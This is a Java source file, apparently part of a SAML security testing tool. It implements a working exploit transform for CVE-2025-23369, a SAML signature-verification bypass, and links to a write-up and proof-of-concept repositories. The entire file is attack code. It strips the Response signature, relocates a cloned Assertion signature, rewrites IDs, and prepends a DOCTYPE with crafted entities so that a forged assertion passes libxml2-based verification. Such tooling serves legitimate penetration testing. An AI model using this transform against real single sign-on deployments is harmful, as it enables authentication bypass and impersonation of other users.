package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/// Links:
/// * https://repzret.blogspot.com/2025/02/abusing-libxml2-quirks-to-bypass-saml.html
/// * https://github.com/hakivvi/CVE-2025-23369
/// * https://github.com/d0ge/proof-of-concept-labs/tree/saml-libxml2/ruby-saml-libxml
public class CVE_2025_23369 {

    public static final String CVE = "CVE-2025-23369";

    public static String apply(String samlMessage) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        // Get the Response and Assertion elements.
        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);

        if (response == null) {
            throw new IllegalArgumentException("No 'Response' element found.");
        }

        if (assertion == null) {
            throw new IllegalArgumentException("No 'Assertion' element found.");
        }

        // Get all Signature nodes.
        NodeList sigNodes = document.getElementsByTagNameNS("*", "Signature");
        // Copy into a list since we may remove nodes during iteration.
        List<Element> signatureList = new ArrayList<>();
        for (int i = 0; i < sigNodes.getLength(); i++) {
            signatureList.add((Element) sigNodes.item(i));
        }

        // Remove signature nodes that reference the Response element's ID.
        String responseID = response.getAttribute("ID");
        for (Element sig : signatureList) {
            // Locate the Reference element (assumes one exists per Signature).
            NodeList refList = sig.getElementsByTagNameNS("*", "Reference");
            if (refList.getLength() > 0) {
                Element ref = (Element) refList.item(0);
                String uri = ref.getAttribute("URI");
                if (uri.startsWith("#")) {
                    uri = uri.substring(1); // remove leading '#'
                }
                if (uri.equals(responseID)) {
                    sig.getParentNode().removeChild(sig);
                }
            }
        }

        // Find the Signature node that references the Assertion's ID.
        String assertionID = assertion.getAttribute("ID");
        Element assertionSignature = null;
        // Re-fetch remaining Signature nodes.
        NodeList remainingSigs = document.getElementsByTagNameNS("*", "Signature");
        for (int i = 0; i < remainingSigs.getLength(); i++) {
            Element sig = (Element) remainingSigs.item(i);
            NodeList refList = sig.getElementsByTagNameNS("*", "Reference");
            if (refList.getLength() > 0) {
                Element ref = (Element) refList.item(0);
                String uri = ref.getAttribute("URI");
                if (uri.startsWith("#")) {
                    uri = uri.substring(1);
                }
                if (uri.equals(assertionID)) {
                    assertionSignature = sig;
                    break;
                }
            }
        }

        // If the found assertion signature is not already a child of the Response, clone it and attach it.
        if (assertionSignature != null && !assertionSignature.getParentNode().isSameNode(response)) {
            // Deep clone the signature.
            Node clonedSig = assertionSignature.cloneNode(true);

            // Try to locate an Issuer node within the Response.
            NodeList issuerList = response.getElementsByTagNameNS("*", "Issuer");
            if (issuerList.getLength() > 0) {
                Node issuer = issuerList.item(0);
                // Insert the cloned signature immediately after the issuer.
                Node parent = issuer.getParentNode();
                Node nextSibling = issuer.getNextSibling();
                if (nextSibling != null) {
                    parent.insertBefore(clonedSig, nextSibling);
                } else {
                    parent.appendChild(clonedSig);
                }
            } else {
                // Fallback: simply append to the Response.
                response.appendChild(clonedSig);
            }

            // Create an Object element with the proper XMLDSig namespace and explicitly set xmlns.
            Element objectNode = document.createElementNS("http://www.w3.org/2000/09/xmldsig#", "Object");
            // force namespace to fix some errors
            objectNode.setAttribute("xmlns", "http://www.w3.org/2000/09/xmldsig#");
            clonedSig.appendChild(objectNode);
            // Append a deep clone of the Assertion node to the Object node.
            objectNode.appendChild(assertion.cloneNode(true));
        }

        // Change the Assertion's ID attribute by appending "ffff".
        String originalAssertionID = assertion.getAttribute("ID");
        assertion.setAttribute("ID", originalAssertionID + "ffff");

        // Remove any Signature element that is a direct child of the Assertion.
        NodeList assertionChildren = assertion.getChildNodes();
        for (int i = 0; i < assertionChildren.getLength(); i++) {
            Node child = assertionChildren.item(i);
            if (child.getNodeType() == Node.ELEMENT_NODE) {
                Element childElem = (Element) child;
                if ("Signature".equals(childElem.getLocalName())) {
                    assertion.removeChild(childElem);
                    break;
                }
            }
        }

        // DOCTYPE declaration hack to avoid usage of Java reflections
        List<String> doctypeEntities = new ArrayList<>();

        // Set the Response's ID attribute to a new fixed value.
        response.setAttribute("ID", "&idViaEntity;");
        // Look for a Signature > Object > Assertion chain inside the Response.
        NodeList responseChildNodes = response.getChildNodes();
        for (int i = 0; i < responseChildNodes.getLength(); i++) {
            Node child = responseChildNodes.item(i);
            if (child.getNodeType() == Node.ELEMENT_NODE && "Signature".equals(child.getLocalName())) {
                // Within this Signature, search for an Object node.
                NodeList objectNodes = ((Element) child).getElementsByTagNameNS("*", "Object");
                for (int j = 0; j < objectNodes.getLength(); j++) {
                    Element objectElem = (Element) objectNodes.item(j);
                    // Within Object, search for an Assertion node.
                    NodeList assertionNodes = objectElem.getElementsByTagNameNS("*", "Assertion");
                    if (assertionNodes.getLength() > 0) {
                        Element objectAssertion = (Element) assertionNodes.item(0);
                        // Modify its ID by prefixing with "BypassIDUniqueness".
                        String objAssertionID = objectAssertion.getAttribute("ID");
                        objectAssertion.setAttribute("ID", "&BypassIDUniqueness;" + objAssertionID);

                        doctypeEntities.add(String.format("<!ENTITY %s \"%s\">\n", "idViaEntity", objAssertionID));
                        doctypeEntities.add(String.format("<!ENTITY %s \"%s\">\n", "BypassIDUniqueness", "&#x50;"));
                        break;
                    }
                }
            }
        }

        StringBuilder doctypePayload = new StringBuilder("<!DOCTYPE response [\n");
        for (String entity : doctypeEntities) {
            doctypePayload.append(entity);
        }
        doctypePayload.append("]>");
        doctypeEntities.clear();

        samlMessage = xmlHelpers.getString(document);
        samlMessage = samlMessage.replace("&amp;", "&");

        int declarationEnd = samlMessage.indexOf("?>");
        if (declarationEnd != -1) {
            return samlMessage.substring(0, declarationEnd + 2) + doctypePayload + samlMessage.substring(declarationEnd + 2);
        }

        String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
        return xmlDeclaration + doctypePayload + samlMessage;
    }

    private CVE_2025_23369() {
        // static class
    }
}
